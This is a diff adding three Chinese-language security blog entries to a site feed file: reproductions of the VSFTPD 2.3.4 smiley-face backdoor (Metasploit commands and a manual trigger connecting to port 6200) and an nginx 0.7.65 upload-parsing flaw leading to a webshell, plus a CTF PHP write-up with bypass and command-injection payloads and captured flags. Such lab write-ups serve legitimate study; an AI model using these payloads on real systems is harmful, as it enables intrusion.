@@ -23,6 +23,81 @@
     
     
     <entry>
+      <title>VSFTPD 2.3.4 笑脸漏洞</title>
+      <link href="/2023/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/VSFTPD%202.3.4%20%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2023/09/16/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/VSFTPD%202.3.4%20%E7%AC%91%E8%84%B8%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><strong>压缩包需要下载特定版本，官方提供的安装包没有这个漏洞</strong></p><p>1.靶机环境是centos7  ，首先解压缩包，并上传到靶机目录</p><p>  tar -zxvf   压缩包名称</p><p>2.进入vsftpd目录，赋予文件权限，之后进行make &amp;&amp;make install</p><p>cd &#x2F;vsftpd-2.3.4</p><p>chmod 777 *</p><p>make &amp;&amp;make install</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="code-1"><a href="#code-1" class="headerlink" title="code:1"></a>code:1</h2><p>使用msf利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor </span><br><span class="line">set RhoSTS 192.168.142.145</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><h2 id="code-2"><a href="#code-2" class="headerlink" title="code:2"></a>code:2</h2><p>手动利用</p><p>打开命令行登录ftp服务器，在用户名处输入root:)然后随意输入一个密码回车等待，</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309160952000.png" alt="image-20230916095254559"></p><p>输入nc 目标ip 6200 即可连接</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309160953548.png" alt="image-20230916095306663"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>nginx-0.7.65 解析漏洞</title>
+      <link href="/2023/09/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/nginx-0.7.65_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+      <url>/2023/09/15/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/nginx-0.7.65_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">startup.bat</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213590.png" alt="image-20230907231048142"></p><p>​            2.     访问抓包修改文件后缀</p><p>​可以显示phpinfo</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152216623.png" alt="image-20230915221602546"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152214832.png" alt="image-20230907231341384"></p><h2 id="Nginx-解析漏洞复现"><a href="#Nginx-解析漏洞复现" class="headerlink" title="Nginx 解析漏洞复现"></a><strong>Nginx 解析漏洞复现</strong></h2><p>1.开启环境</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213593.png" alt="image-20230907231417121"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213591.png" alt="image-20230907231433052"></p><p>2.抓包修改文件后缀，类型以及内容头</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152217207.png" alt="image-20230907231444059"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213523.png" alt="image-20230907231454645"></p><p>上传成功</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152213054.png" alt="image-20230907231514105"></p><p>使用蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152214790.png" alt="image-20230907231534418"></p><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309152218679.png" alt="image-20230915221837364"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>青少年CTF-B2-PHP特性练习01-04</title>
+      <link href="/2023/05/12/CTF/%E9%9D%92%E5%B0%91%E5%B9%B4CTF-B2-PHP%E7%89%B9%E6%80%A7%E7%BB%83%E4%B9%A0/"/>
+      <url>/2023/05/12/CTF/%E9%9D%92%E5%B0%91%E5%B9%B4CTF-B2-PHP%E7%89%B9%E6%80%A7%E7%BB%83%E4%B9%A0/</url>
+      
+        <content type="html"><![CDATA[<h2 id="PHP特性01"><a href="#PHP特性01" class="headerlink" title="PHP特性01"></a>PHP特性01</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username[]=admi&amp;password[]=admin</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161032137.png" alt="image">​</p><p>qsnctf{ca5f80d8-085c-4a8d-b474-a74bd1a4aada}</p><h2 id="PHP特性02"><a href="#PHP特性02" class="headerlink" title="PHP特性02"></a>PHP特性02</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value=%<span class="number">0</span>c1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031690.png" alt="image">​</p><p>qsnctf{c6c71221-f298-41ad-9da8-ca53b4a8b144}</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在php中：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">num = %<span class="number">0</span>c36;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="variable">$num</span>==<span class="string">&#x27;36&#x27;</span>);<span class="comment">//  ---&gt; True</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>对于比较运算符号：如果两个操作数都是 数字字符串，或者一个操作数是数字而另一个是 数字字符串，则比较以数字方式进行。当比较是&#x3D;&#x3D;&#x3D;或!&#x3D;&#x3D;因为这涉及比较类型和值时，不会发生类型转换 ，因此此时类型和数值都要比对</p><p>所以：**&#x3D;&#x3D;比较的是类型转换之后的数值 而 !&#x3D;&#x3D;不仅要比较数值还要比较类型**</p><p>payload构造的时候只要在1前面写一个空的字符就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?value=%<span class="number">0</span>c1</span><br><span class="line">?value= <span class="number">1</span></span><br><span class="line">?value=%<span class="number">201</span></span><br><span class="line">?value=+<span class="number">01</span></span><br></pre></td></tr></table></figure><h2 id="PHP特性03"><a href="#PHP特性03" class="headerlink" title="PHP特性03"></a>PHP特性03</h2><p>双写绕过</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value=庆历四年春，滕滕子京子京谪守巴巴陵郡陵郡。越明年，政通人和，百废俱兴，乃重修岳岳阳楼阳楼，增其旧制，刻唐贤今人诗赋于其上，属予作文以记之。</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031433.png" alt="image">​</p><p>qsnctf(de64416c-6ff2-4f24-b9c8-7e32f84dda30)</p><h2 id="PHP特性04"><a href="#PHP特性04" class="headerlink" title="PHP特性04"></a>PHP特性04</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?command=<span class="title function_ invoke__">System</span>(<span class="string">&quot;cat f*&quot;</span>);&amp;key=cXNuY3Rm</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jianhao-security/blogs-image@main/202309161031970.png" alt="image">​</p><p><code>qsnctf&#123;803a0ef5-86e7-4d94-8f1d-3cb8332ee793&#125;</code>​</p><p>‍</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> qsnctf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>博客自述</title>
       <link href="/2022/12/27/hello-world/"/>
       <url>/2022/12/27/hello-world/</url>
